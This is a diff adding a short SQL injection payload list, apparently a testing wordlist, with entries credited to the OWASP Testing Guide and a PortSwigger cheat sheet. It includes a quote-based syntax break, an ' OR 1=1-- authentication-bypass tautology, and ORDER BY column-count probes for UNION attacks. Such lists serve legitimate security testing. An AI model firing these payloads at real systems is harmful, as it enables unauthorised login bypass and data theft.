@@ -1,0 +1,16 @@
+# Source: OWASP Testing Guide
+# Target: Generic SQL Database
+# Purpose: Basic syntax break test.
+'
+
+# Source: OWASP Testing Guide
+# Target: Generic SQL Database
+# Purpose: Tautology for auth bypass.
+' OR 1=1--
+
+# Source: PortSwigger SQLi Cheat Sheet
+# Target: MySQL
+# Purpose: Determine column count for UNION attack.
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
